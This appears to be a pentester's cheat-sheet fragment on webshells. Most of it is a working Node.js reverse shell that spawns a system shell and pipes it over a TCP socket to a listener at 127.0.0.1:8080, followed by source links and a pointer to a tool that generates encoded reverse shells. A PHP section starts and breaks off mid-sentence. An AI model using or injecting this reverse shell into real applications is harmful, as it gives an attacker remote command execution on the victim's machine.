# Webshells

## Javascript

```js
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn((process.platform.contains('win')?'cmd.exe':'/bin/sh'),[]);
    var client = new net.Socket();
    client.connect(8080, "127.0.0.1", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();
```

Source: [https://wiremask.eu/writeups/reverse-shell-on-a-nodejs-application/](https://wiremask.eu/writeups/reverse-shell-on-a-nodejs-application/)  
Source: [https://github.com/evilpacket/node-shells/blob/master/node\_revshell.js](https://github.com/evilpacket/node-shells/blob/master/node_revshell.js)

We can also use [nodejsshell.py](https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py) to generate encoded reverse shells.

## PHP

These are the most common types of shells we'll be turning to, as like it or not, PHP is probably the most common type of 

### 



